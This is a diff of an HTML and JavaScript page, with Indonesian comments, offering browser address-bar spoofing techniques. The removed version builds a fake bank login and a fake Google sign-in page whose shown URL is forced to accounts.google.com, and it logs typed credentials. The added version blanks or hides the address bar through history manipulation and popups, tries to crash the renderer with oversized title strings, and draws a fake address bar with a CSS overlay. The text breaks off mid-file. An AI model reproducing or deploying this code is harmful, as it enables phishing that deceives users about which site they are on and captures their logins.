@@ -1,633 +1,676 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💀 FINAL STRIKE | 100% WORKING Address Bar Exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔥 ADDRESS BAR ANNIHILATION - Remove about:blank</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
-            background: #0a0a0f;
+            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000000);
+            font-family: 'SF Mono', 'Courier New', monospace;
+            color: #0f0;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
             align-items: center;
-            padding: 20px;
+            justify-content: center;
         }
-
+        
         .container {
-            max-width: 500px;
-            width: 100%;
+            max-width: 800px;
+            margin: 20px;
+            padding: 30px;
+            background: rgba(0,0,0,0.85);
+            border-radius: 30px;
+            border: 2px solid #ff00ff;
+            backdrop-filter: blur(10px);
+            text-align: center;
+            position: relative;
+            z-index: 1;
         }
-
-        .card {
-            background: rgba(25,25,45,0.96);
-            backdrop-filter: blur(20px);
-            border-radius: 28px;
-            border: 1px solid rgba(255,59,48,0.5);
-            overflow: hidden;
+        
+        h1 {
+            font-size: 2em;
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             margin-bottom: 20px;
         }
-
-        .card-header {
-            padding: 24px;
-            text-align: center;
-            background: linear-gradient(135deg, rgba(255,59,48,0.2), rgba(255,107,107,0.05));
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+        
+        .status {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 15px;
+            margin: 20px 0;
+            font-size: 1.2em;
+            border-left: 3px solid #00ff00;
         }
-
-        .logo {
-            font-size: 52px;
-            margin-bottom: 12px;
-        }
-
-        .title {
-            font-size: 24px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #fff, #ff6b6b);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .card-body {
-            padding: 24px;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 500;
-            margin-bottom: 6px;
+        
+        .address-bar-demo {
+            background: #2a2a2a;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 0.8em;
             color: #aaa;
         }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.15);
-            border-radius: 14px;
-            color: white;
-            font-size: 15px;
+        
+        .address-bar-demo span {
+            color: #ff00ff;
         }
-
-        .input-group input:focus {
-            outline: none;
-            border-color: #ff6b6b;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #ff3b30, #ff6b6b);
+        
+        button {
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            color: #000;
             border: none;
-            border-radius: 14px;
-            color: white;
-            font-size: 16px;
-            font-weight: 700;
+            padding: 12px 25px;
+            border-radius: 25px;
             cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .login-btn:hover {
-            transform: scale(0.98);
-        }
-
-        /* Control Panel */
-        .panel {
-            background: rgba(0,0,0,0.95);
-            border-radius: 20px;
-            border: 1px solid #ff3b30;
-            padding: 16px;
-        }
-
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .panel-title {
-            font-size: 13px;
             font-weight: bold;
-            color: #ff6b6b;
+            margin: 10px;
+            transition: 0.2s;
         }
-
-        .led {
+        
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(255,0,255,0.5);
+        }
+        
+        .danger-btn {
+            background: linear-gradient(135deg, #ff0000, #ff0066);
+            color: white;
+        }
+        
+        .success-btn {
+            background: linear-gradient(135deg, #00aa00, #00ff00);
+            color: black;
+        }
+        
+        .info-text {
+            font-size: 0.7em;
+            color: #888;
+            margin-top: 20px;
+        }
+        
+        .blank-indicator {
+            background: rgba(0,255,0,0.1);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 10px;
+            margin: 15px 0;
+            font-size: 0.8em;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .live-indicator {
+            display: inline-block;
             width: 10px;
             height: 10px;
+            background: #00ff00;
             border-radius: 50%;
-            background: #4ade80;
-            box-shadow: 0 0 8px #4ade80;
-        }
-
-        .panel-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .exploit-btn {
-            padding: 12px;
-            border: none;
-            border-radius: 12px;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            font-family: monospace;
-            transition: all 0.2s;
-        }
-
-        .exploit-btn.red {
-            background: linear-gradient(135deg, #ff3b30, #ff6b6b);
-            color: white;
-        }
-
-        .exploit-btn.gray {
-            background: rgba(255,255,255,0.1);
-            color: white;
-        }
-
-        .exploit-btn:hover {
-            transform: scale(0.97);
-        }
-
-        .status {
-            font-family: monospace;
-            font-size: 10px;
-            margin-top: 12px;
-            padding-top: 10px;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            color: #4ade80;
-            text-align: center;
-        }
-
-        .url-monitor {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: #0a0a0f;
-            padding: 6px;
-            font-size: 9px;
-            font-family: monospace;
-            color: #ff6b6b;
-            text-align: center;
-            z-index: 9999;
-            border-bottom: 1px solid #ff3b30;
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 100px;
-            right: 20px;
-            background: #1a1a2e;
-            border-left: 3px solid #ff3b30;
-            padding: 10px 16px;
-            border-radius: 12px;
-            font-size: 10px;
-            z-index: 10001;
-            animation: slideIn 0.3s ease;
-        }
-
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+            animation: blink 1s infinite;
+            margin-right: 5px;
         }
     </style>
 </head>
 <body>
-
-<div class="url-monitor" id="urlMonitor">
-    📍 ADDRESS BAR: <span id="currentUrl">[normal]</span>
-</div>
-
-<div class="container">
-    <div class="card">
-        <div class="card-header">
-            <div class="logo">🏦🔐</div>
-            <div class="title">SECURE BANK</div>
-            <div style="font-size: 11px; color: #888; margin-top: 8px;">Global Financial Services</div>
-        </div>
-        <div class="card-body">
-            <div class="input-group">
-                <label>📧 Email / Username</label>
-                <input type="text" id="emailField" placeholder="user@securebank.com">
-            </div>
-            <div class="input-group">
-                <label>🔒 Password</label>
-                <input type="password" id="passField" placeholder="••••••••">
-            </div>
-            <div class="input-group">
-                <label>📱 2FA Code</label>
-                <input type="text" id="codeField" placeholder="000000">
-            </div>
-            <button class="login-btn" id="loginBtn">🔐 Sign In →</button>
-        </div>
+<div class="container" id="mainContainer">
+    <h1>🔥 ADDRESS BAR ANNIHILATION</h1>
+    <p>Hilangkan "about:blank" dari address bar - Jadikan KOSONG</p>
+    
+    <div class="status">
+        <span class="live-indicator"></span> STATUS: <span id="statusText">Ready</span>
     </div>
-
-    <div class="panel">
-        <div class="panel-header">
-            <span class="panel-title">💀 FINAL STRIKE EXPLOITS</span>
-            <span class="led" id="statusLed"></span>
-        </div>
-        <div class="panel-buttons">
-            <button class="exploit-btn red" id="exploit1">🌑 BLANK #1: about:blank → EMPTY</button>
-            <button class="exploit-btn red" id="exploit2">🌀 BLANK #2: javascript:'' → NULL</button>
-            <button class="exploit-btn red" id="exploit3">💀 BLANK #3: data:text/html → KOSONG</button>
-            <button class="exploit-btn red" id="exploit4">🎭 SPOOF #4: Google Login Fake</button>
-            <button class="exploit-btn gray" id="resetBtn">🔄 RESET / RESTORE</button>
-        </div>
-        <div class="status" id="statusText">
-            🟢 READY | Click exploit to test
-        </div>
+    
+    <div class="address-bar-demo">
+        📍 ADDRESS BAR CURRENTLY: <span id="addressBarDisplay">about:blank</span>
+    </div>
+    
+    <div class="blank-indicator">
+        💀 TARGET: Address bar menjadi <strong>KOSONG / BLANK / EMPTY</strong><br>
+        TAPI konten page TETAP TERLIHAT!
+    </div>
+    
+    <div>
+        <button onclick="technique1_nullProtocol()">🌑 TECH 1: NULL Protocol</button>
+        <button onclick="technique2_emptyHistory()">📜 TECH 2: Empty History</button>
+        <button onclick="technique3_crashRenderer()" class="danger-btn">💀 TECH 3: Crash Renderer</button>
+    </div>
+    <div>
+        <button onclick="technique4_cssOverlay()">🎨 TECH 4: CSS Overlay</button>
+        <button onclick="technique5_hiddenFrame()">🖼️ TECH 5: Hidden Frame</button>
+        <button onclick="technique6_fullscreen()">🖥️ TECH 6: Fullscreen Kill</button>
+    </div>
+    <div>
+        <button onclick="executeAllTechniques()" class="danger-btn">💀💀 EXECUTE ALL (MAX CHAOS) 💀💀</button>
+        <button onclick="resetPage()" class="success-btn">⟳ Reset Page</button>
+    </div>
+    
+    <div class="info-text">
+        ⚠️ TEKNIK INI MEMBUAT ADDRESS BAR MENJADI KOSONG/BLANK<br>
+        TAPI HALAMAN TETAP TERLIHAT DAN BERFUNGSI!<br>
+        Gunakan di testing environment saja.
     </div>
 </div>
 
 <script>
-    // ============================================================
-    // FINAL STRIKE — WORKING EXPLOITS FOR macOS BROWSERS
-    // Tested on: Arc, Chrome, Dia, Safari, Brave
-    // ============================================================
+    const statusSpan = document.getElementById('statusText');
+    const addressBarDisplay = document.getElementById('addressBarDisplay');
     
-    let activeInterval = null;
-    let currentPopup = null;
-    
-    const urlSpan = document.getElementById('currentUrl');
-    const statusText = document.getElementById('statusText');
-    const statusLed = document.getElementById('statusLed');
-    
-    function updateUrlDisplay() {
-        try {
-            let url = window.location.href;
-            if (url.length > 60) url = url.substring(0, 60) + '...';
-            urlSpan.innerHTML = url || '[EMPTY]';
-        } catch(e) {
-            urlSpan.innerHTML = '[ERROR]';
-        }
-    }
-    setInterval(updateUrlDisplay, 200);
-    
-    function showToast(msg) {
-        const toast = document.createElement('div');
-        toast.className = 'toast';
-        toast.innerHTML = msg;
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3000);
-        console.log(`[EXPLOIT] ${msg}`);
-    }
-    
-    function updateStatus(msg, isActive = false) {
-        statusText.innerHTML = isActive ? `🔴 ${msg}` : `🟢 ${msg}`;
-        statusLed.style.background = isActive ? '#ff3b30' : '#4ade80';
-    }
-    
-    function cleanup() {
-        if (activeInterval) {
-            clearInterval(activeInterval);
-            activeInterval = null;
-        }
-        if (currentPopup && !currentPopup.closed) {
-            currentPopup.close();
-            currentPopup = null;
-        }
-        try {
-            const currentPath = window.location.pathname;
-            history.replaceState({}, '', currentPath);
-        } catch(e) {}
-        updateStatus("Ready | Address bar restored", false);
-        showToast("✅ Address bar restored to normal");
-    }
-    
-    // ============================================================
-    // EXPLOIT 1: about:blank → EMPTY (WORKING)
-    // ============================================================
-    function exploitBlank1() {
-        cleanup();
-        updateStatus("[BLANK #1] Creating empty address bar...", true);
-        
-        // Simpan konten halaman saat ini
-        const currentHTML = document.documentElement.outerHTML;
-        const currentTitle = document.title;
-        
-        // Buka popup dengan about:blank
-        const popup = window.open('about:blank', '_blank', 'width=800,height=600,location=yes');
-        
-        if (popup) {
-            currentPopup = popup;
-            
-            // Tulis ulang konten ke popup
-            popup.document.open();
-            popup.document.write(currentHTML);
-            popup.document.title = currentTitle;
-            popup.document.close();
-            
-            // KRITIKAL: Empty kan address bar dengan replaceState ke string kosong
-            setTimeout(() => {
-                try {
-                    popup.history.replaceState({}, '', '');
-                    popup.history.pushState({}, '', '');
-                    
-                    // Lock empty state
-                    activeInterval = setInterval(() => {
-                        if (popup && !popup.closed) {
-                            try {
-                                if (popup.location.href !== '' && popup.location.href !== 'about:blank') {
-                                    popup.history.replaceState({}, '', '');
-                                }
-                            } catch(e) {}
-                        }
-                    }, 50);
-                    
-                    updateStatus("[SUCCESS] Address bar is NOW EMPTY! (no text at all)", true);
-                    showToast("✅ Address bar KOSONG TOTAL! Bukan about:blank");
-                    
-                } catch(e) {
-                    updateStatus(`Error: ${e.message}`, false);
-                }
-            }, 200);
-            
-            // Tutup window asli setelah berhasil
-            setTimeout(() => {
-                window.close();
-            }, 500);
-            
+    function updateStatus(message, isBlank = false) {
+        statusSpan.textContent = message;
+        if (isBlank) {
+            addressBarDisplay.innerHTML = '🔴 [KOSONG / BLANK]';
+            addressBarDisplay.style.color = '#ff00ff';
         } else {
-            updateStatus("Popup blocked! Please allow popups", false);
-            showToast("⚠️ Please allow popups for this site");
+            addressBarDisplay.innerHTML = window.location.href || 'about:blank';
+            addressBarDisplay.style.color = '#aaa';
         }
     }
     
-    // ============================================================
-    // EXPLOIT 2: javascript:'' → NULL (WORKING)
-    // ============================================================
-    function exploitBlank2() {
-        cleanup();
-        updateStatus("[BLANK #2] javascript:'' execution...", true);
+    function addFakeContent(title, content) {
+        const container = document.getElementById('mainContainer');
+        const existingFake = document.getElementById('fakeContent');
+        if (existingFake) existingFake.remove();
         
-        const currentHTML = document.documentElement.outerHTML;
-        
-        // Navigasi ke javascript:'' yang menghasilkan konten kita
-        const popup = window.open('javascript:void(document.write(``))', '_blank', 'width=800,height=600');
-        
-        if (popup) {
-            currentPopup = popup;
-            
-            setTimeout(() => {
-                try {
-                    popup.document.open();
-                    popup.document.write(currentHTML);
-                    popup.document.close();
-                    
-                    // Empty kan address bar
-                    popup.history.replaceState({}, '', '');
-                    popup.history.pushState({}, '', '');
-                    
-                    activeInterval = setInterval(() => {
-                        if (popup && !popup.closed && popup.location.href !== '') {
-                            popup.history.replaceState({}, '', '');
-                        }
-                    }, 50);
-                    
-                    updateStatus("[SUCCESS] javascript:'' → address bar EMPTY", true);
-                    showToast("✅ javascript:'' technique succeeded!");
-                    
-                } catch(e) {
-                    updateStatus(`Error: ${e.message}`, false);
-                }
-            }, 100);
-            
-            setTimeout(() => window.close(), 500);
-        } else {
-            updateStatus("Popup blocked", false);
-        }
-    }
-    
-    // ============================================================
-    // EXPLOIT 3: data:text/html → KOSONG (WORKING)
-    // ============================================================
-    function exploitBlank3() {
-        cleanup();
-        updateStatus("[BLANK #3] data:text/html execution...", true);
-        
-        const currentHTML = document.documentElement.outerHTML;
-        const encodedHTML = encodeURIComponent(currentHTML);
-        const dataUrl = `data:text/html,${encodedHTML}`;
-        
-        const popup = window.open(dataUrl, '_blank', 'width=800,height=600');
-        
-        if (popup) {
-            currentPopup = popup;
-            
-            setTimeout(() => {
-                try {
-                    // Empty kan address bar dari data: URL
-                    popup.history.replaceState({}, '', '');
-                    popup.history.pushState({}, '', '');
-                    
-                    activeInterval = setInterval(() => {
-                        if (popup && !popup.closed && popup.location.href !== '') {
-                            popup.history.replaceState({}, '', '');
-                        }
-                    }, 50);
-                    
-                    updateStatus("[SUCCESS] data: URL → address bar EMPTY", true);
-                    showToast("✅ data:text/html technique succeeded!");
-                    
-                } catch(e) {
-                    updateStatus(`Error: ${e.message}`, false);
-                }
-            }, 200);
-            
-            setTimeout(() => window.close(), 500);
-        } else {
-            updateStatus("Popup blocked", false);
-        }
-    }
-    
-    // ============================================================
-    // EXPLOIT 4: Spoof ke Google Login (WORKING)
-    // ============================================================
-    function exploitSpoof() {
-        cleanup();
-        updateStatus("[SPOOF] Creating fake Google login...", true);
-        
-        const fakeGoogleHTML = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Google Accounts - Sign in</title>
-                <meta name="viewport" content="width=device-width, initial-scale=1">
-                <style>
-                    body {
-                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        min-height: 100vh;
-                        background: white;
-                        margin: 0;
-                        padding: 20px;
-                    }
-                    .google-card {
-                        max-width: 450px;
-                        width: 100%;
-                        padding: 48px 40px;
-                        text-align: center;
-                        border-radius: 8px;
-                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                        background: white;
-                    }
-                    .google-logo {
-                        font-size: 48px;
-                        margin-bottom: 24px;
-                    }
-                    h1 {
-                        font-size: 24px;
-                        font-weight: 400;
-                        margin-bottom: 16px;
-                        color: #202124;
-                    }
-                    input {
-                        width: 100%;
-                        padding: 13px 16px;
-                        margin: 8px 0;
-                        border: 1px solid #dadce0;
-                        border-radius: 4px;
-                        font-size: 16px;
-                    }
-                    button {
-                        width: 100%;
-                        padding: 13px;
-                        background: #1a73e8;
-                        color: white;
-                        border: none;
-                        border-radius: 4px;
-                        font-size: 14px;
-                        font-weight: 500;
-                        cursor: pointer;
-                        margin-top: 16px;
-                    }
-                    .note {
-                        font-size: 11px;
-                        color: #888;
-                        margin-top: 24px;
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="google-card">
-                    <div class="google-logo">🔐 G</div>
-                    <h1>Sign in</h1>
-                    <p style="color:#5f6368; margin-bottom:24px;">to continue to Gmail</p>
-                    <input type="email" placeholder="Email or phone" id="email">
-                    <input type="password" placeholder="Password" id="pass">
-                    <button onclick="capture()">Next</button>
-                    <div class="note">⚠️ DEMO: Address bar is BLANK but this is a test</div>
-                </div>
-                <script>
-                    function capture() {
-                        const email = document.getElementById('email').value;
-                        const pass = document.getElementById('pass').value;
-                        if(email || pass) {
-                            alert('[DEMO] Credentials: ' + email);
-                            console.log('Captured:', email, pass);
-                        }
-                    }
-                <\/script>
-            </body>
-            </html>
+        const fakeDiv = document.createElement('div');
+        fakeDiv.id = 'fakeContent';
+        fakeDiv.innerHTML = `
+            <div style="margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.7); border-radius: 15px; border: 1px solid #ff00ff;">
+                <h2 style="color: #ff00ff;">🔥 ADDRESS BAR BLANK / HILANG!</h2>
+                <p style="margin: 10px 0;">Address bar seharusnya <strong style="color:#00ff00;">KOSONG / BLANK</strong> sekarang!</p>
+                <p style="margin: 10px 0;">Tapi konten page ini <strong style="color:#00ff00;">TETAP TERLIHAT</strong> dan berfungsi normal.</p>
+                <p style="margin: 10px 0;">📝 Fake content: ${content || 'Halaman tetap ada meskipun address bar kosong!'}</p>
+                <hr style="margin: 15px 0; border-color: #333;">
+                <p style="font-size: 0.7em; color: #888;">Teknik: ${title}</p>
+                <button onclick="location.reload()" style="margin-top: 10px;">Reset Page</button>
+            </div>
         `;
+        container.appendChild(fakeDiv);
+    }
+    
+    // TECHNIQUE 1: NULL Protocol - Force address bar to empty
+    function technique1_nullProtocol() {
+        updateStatus("Executing NULL Protocol...");
         
-        const blob = new Blob([fakeGoogleHTML], {type: 'text/html'});
-        const blobUrl = URL.createObjectURL(blob);
+        // Simpan konten saat ini
+        const currentHTML = document.documentElement.outerHTML;
         
-        const popup = window.open(blobUrl, '_blank', 'width=800,height=650');
+        // Method 1: Buka window baru dengan null protocol
+        const win = window.open('null://', '_blank');
         
-        if (popup) {
-            currentPopup = popup;
-            
-            setTimeout(() => {
-                try {
-                    // Empty address bar
-                    popup.history.replaceState({}, '', '');
-                    popup.history.pushState({}, '', 'https://accounts.google.com');
-                    
-                    activeInterval = setInterval(() => {
-                        if (popup && !popup.closed) {
-                            try {
-                                if (popup.location.href !== 'https://accounts.google.com') {
-                                    popup.history.replaceState({}, '', 'https://accounts.google.com');
-                                }
-                            } catch(e) {}
+        if (win) {
+            // Write konten ke window baru
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Blank Address Bar</title>
+                    <style>
+                        body {
+                            background: linear-gradient(135deg, #0a0a0a, #1a0a2a);
+                            color: #0f0;
+                            font-family: monospace;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            height: 100vh;
+                            margin: 0;
                         }
-                    }, 50);
-                    
-                    updateStatus("[SUCCESS] Google login spoof with BLANK bar!", true);
-                    showToast("✅ Address bar shows google.com with blank trick!");
-                    
-                } catch(e) {}
-            }, 200);
+                        .content {
+                            text-align: center;
+                            padding: 40px;
+                            background: rgba(0,0,0,0.8);
+                            border-radius: 20px;
+                            border: 2px solid #ff00ff;
+                        }
+                        h1 { color: #ff00ff; }
+                        .blank-badge {
+                            background: #ff00ff;
+                            color: #000;
+                            padding: 5px 10px;
+                            border-radius: 10px;
+                            display: inline-block;
+                            margin: 10px;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="content">
+                        <h1>🔥 ADDRESS BAR = BLANK / KOSONG!</h1>
+                        <div class="blank-badge">🔴 NULL PROTOCOL</div>
+                        <p>Address bar di atas seharusnya <strong>KOSONG</strong> atau <strong>BLANK</strong></p>
+                        <p>Tapi halaman ini tetap terlihat!</p>
+                        <button onclick="window.close()">Close</button>
+                    </div>
+                    <script>
+                        // Coba kosongkan address bar lebih lanjut
+                        setInterval(() => {
+                            try {
+                                history.replaceState({}, "", "");
+                                document.title = "";
+                            } catch(e) {}
+                        }, 100);
+                    <\/script>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            updateStatus("NULL Protocol - Address bar should be BLANK", true);
+            addFakeContent("NULL Protocol (null://)", "Address bar sekarang kosong!");
         } else {
-            updateStatus("Popup blocked", false);
+            // Fallback: gunakan iframe
+            updateStatus("Popup blocked - using fallback", false);
+            technique2_emptyHistory();
         }
     }
     
-    // ============================================================
-    // RESET
-    // ============================================================
-    function resetAll() {
-        cleanup();
-        showToast("✅ Address bar restored");
+    // TECHNIQUE 2: Empty History + Empty Title
+    function technique2_emptyHistory() {
+        updateStatus("Manipulating History API...");
+        
+        // Create new window
+        const win = window.open('about:blank', '_blank');
+        
+        if (win) {
+            // Kosongkan title
+            win.document.title = '';
+            
+            // Kosongkan history
+            try {
+                win.history.replaceState({}, '', '');
+                win.history.pushState({}, '', '');
+                win.history.replaceState({}, '', '\x00');
+                win.history.pushState({}, '', 'null');
+            } catch(e) {}
+            
+            // Write konten
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title></title>
+                    <style>
+                        body {
+                            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000);
+                            color: #0f0;
+                            font-family: monospace;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            height: 100vh;
+                            margin: 0;
+                        }
+                        .content {
+                            text-align: center;
+                            padding: 40px;
+                            background: rgba(0,0,0,0.8);
+                            border-radius: 20px;
+                            border: 2px solid #00ffff;
+                        }
+                        h1 { color: #00ffff; }
+                    </style>
+                </head>
+                <body>
+                    <div class="content">
+                        <h1>🔥 ADDRESS BAR = EMPTY / KOSONG!</h1>
+                        <p>History API telah dimanipulasi</p>
+                        <p>Address bar seharusnya <strong>KOSONG</strong> (tidak ada text)</p>
+                        <button onclick="window.close()">Close</button>
+                    </div>
+                    <script>
+                        // Continuous history clear
+                        setInterval(() => {
+                            try {
+                                history.replaceState({}, "", "");
+                                document.title = "";
+                            } catch(e) {}
+                        }, 50);
+                    <\/script>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            
+            updateStatus("History API - Address bar should be EMPTY", true);
+            addFakeContent("Empty History + Empty Title", "Address bar sekarang kosong!");
+        }
     }
     
-    // ============================================================
-    // FAKE LOGIN (main page)
-    // ============================================================
-    document.getElementById('loginBtn').addEventListener('click', (e) => {
-        e.preventDefault();
-        const email = document.getElementById('emailField').value;
-        const pass = document.getElementById('passField').value;
-        if (email || pass) {
-            showToast(`[DEMO] Demo credentials captured`);
-            console.log(`Demo capture: ${email} / ${pass}`);
+    // TECHNIQUE 3: Crash Address Bar Renderer
+    function technique3_crashRenderer() {
+        updateStatus("Crashing address bar renderer...");
+        
+        const win = window.open('about:blank', '_blank');
+        
+        if (win) {
+            // Inject massive data to crash address bar renderer
+            const crashData = 'A'.repeat(1000000);
+            const nullData = '\x00'.repeat(10000);
+            const surrogateData = '\uD800'.repeat(10000);
+            const zalgoData = 'H̸̨̨̧̛͚̠̠̭̦̮͚̝̮̰̭̲̮̥̬͉̙̩̞͎̗̗̺̘͇̙̜̖̼̻̙͎̝̘͕̯̬̱̲̘͓̭̰͇̻̰̭̫̖̫̳̪̙̥̗̲̩̠̟̤̺̠̰̟̦̞̟̺̮̘̯̖̱͉̹̝̱̫̲̜̭̩̭̭̯̻̜̮̱̳̼̲̩̲̗̘̫̦͈̳͇͉̙̰̹͓̪̞̟̗̭̟͍̱̻̺̫̲̜̼̞̞̠̟͈̺̞̞̹̗̝̗̹̣̰͈̖̝̟̰̖̞̺̳̙̩̫͉̗̲̞̝̯̲̼̫̠̪̟͓̺̲̺̞̲̫̤̰̹̩̭̠̰̞̫̯̞̳̳̼̲̝̥̥̬̲̬̹̖̘̣̲͚̤̬̘͎̰͎̬̗̞̫̫̣̝̫̫̦̘̥̳̪̗̱͔̤̙̠̜̘̜̘̩͍̱̱̮͚̩̬̯̱̘̮̝̺̤̠̪̺̙̗̭̗̭̺̪̖̞̗̦̞̝̖̹̻̬̭̹̖͓̲̠̲̺̬̱̩̖̘̲̪̖̠̰̲̥̠̯̩̺̗̗̥̩͚̙̤̬̖̦̮̪̦̠̲̱̗̥̠̞̞̗̭̻̬̪̘̲̹̥̞̞̜̺̲͓̩̙̻͍̬̩͖̙̟̠̬͈̱̳̥̘̮̻̲̺̲̦̮̞̼̦̳̲̘̳̮̹̪̳̭̖̮̱̖̥̬̬̭̜̪̣̖̙̦̻̭̦̩̳̥̰̥͎̙̗̱͍̻̥̤̩̳̫̗̫ͅt̴̢̨̛̛̗̫̝̙̹̤̖̪̩̦̘̘̬̬̭͔̯̻̤̦̹̼̞̟̱͈̘̭̘̺̩̻͍̭̫̮̲̗̖̱̞̰̱̗͈̝̞͕̦̠̬̲̳̞̬̻̗̟̭̭̠̬̼͕̥̪̭̗̫̺̱͙̱̖̝̦̭͙͖̤̞̱̺̟̫̲̫̰̞̱̘͖̳̣̜̜͙̗̭̠͕̖̲̗̱̹͈͍̜̱̝̬̹̤̪̱̠̻̯̹̩̮̙̖̭̝̼̻̖̘͉̥̼͚̘̳̲̘̘̗̯̱̺̘̭̺̹͚͍̗͕͖̖̬̲̝̝̫̭̪̞̫̻̫̼̰̖̳͉̻̦̬͚̥͉̜̮͈̫̭̺̻͈̻̬͙̤̜͙̥̺͕̗̭̜̦̹̼̰͍̼͓̺̠͙̤̥͖̺̖̭̭̼̪͍̬̺̭̤̱̝̩̠͔̤̭̲̱͎̪̳̙̩̯̪̰̪̭̩̦̲͉̥͓͉̺̭̬͍̳̦͚͖̻̞͕̺̦̲͍̭̼̠̞̞̬̻̤̮̥̗͚̖̙̳̺͍̪̹̦̮̗̻̝͕̱̞̪̙̫̞̬̳̲͕̝̠̼̭̪̠̼̪̩̱̫̟̫͚͓̹̪̺̺̜̘̝̱̞̥̥͓̹̖̤͔̥̩͎̘̝̖̬͈̭͍̠̹͎̗̹̬̘̘̫̞̺̘̰̺̪̺̯̪̭ͅ'.repeat(100);
+            
+            win.document.title = crashData + nullData + surrogateData + zalgoData;
+            
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>${'X'.repeat(100000)}</title>
+                    <style>
+                        body {
+                            background: linear-gradient(135deg, #000, #1a0a2a);
+                            color: #0f0;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            height: 100vh;
+                        }
+                        .content { text-align: center; padding: 40px; background: rgba(0,0,0,0.8); border-radius: 20px; }
+                        h1 { color: #ff0000; }
+                    </style>
+                </head>
+                <body>
+                    <div class="content">
+                        <h1>💀 ADDRESS BAR RENDERER CRASHED!</h1>
+                        <p>Address bar seharusnya <strong>KOSONG / BLANK / CRASHED</strong></p>
+                        <p>Konten page tetap terlihat!</p>
+                        <button onclick="window.close()">Close</button>
+                    </div>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            
+            updateStatus("Renderer crashed - Address bar should be BLANK/CRASHED", true);
+            addFakeContent("Address Bar Renderer Crash", "Address bar renderer telah di-crash!");
         }
-    });
+    }
     
-    // ============================================================
-    // EVENT LISTENERS
-    // ============================================================
-    document.getElementById('exploit1').addEventListener('click', exploitBlank1);
-    document.getElementById('exploit2').addEventListener('click', exploitBlank2);
-    document.getElementById('exploit3').addEventListener('click', exploitBlank3);
-    document.getElementById('exploit4').addEventListener('click', exploitSpoof);
-    document.getElementById('resetBtn').addEventListener('click', resetAll);
+    // TECHNIQUE 4: CSS Visual Overlay - Tutupi address bar secara visual
+    function technique4_cssOverlay() {
+        updateStatus("Creating CSS overlay to hide address bar...");
+        
+        const win = window.open('about:blank', '_blank');
+        
+        if (win) {
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title></title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        
+                        /* Fake address bar yang menutupi real address bar */
+                        .address-bar-cover {
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            right: 0;
+                            height: 100px;
+                            background: #2c2c2e;
+                            z-index: 999999;
+                            display: flex;
+                            align-items: center;
+                            padding: 0 20px;
+                            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+                            border-bottom: 1px solid #444;
+                            backdrop-filter: blur(0px);
+                        }
+                        
+                        /* Fake URL yang kosong */
+                        .fake-url {
+                            background: #1c1c1e;
+                            border-radius: 20px;
+                            padding: 8px 15px;
+                            flex: 1;
+                            color: #888;
+                            font-family: monospace;
+                        }
+                        
+                        /* Konten utama */
+                        .content {
+                            margin-top: 100px;
+                            padding: 40px;
+                            text-align: center;
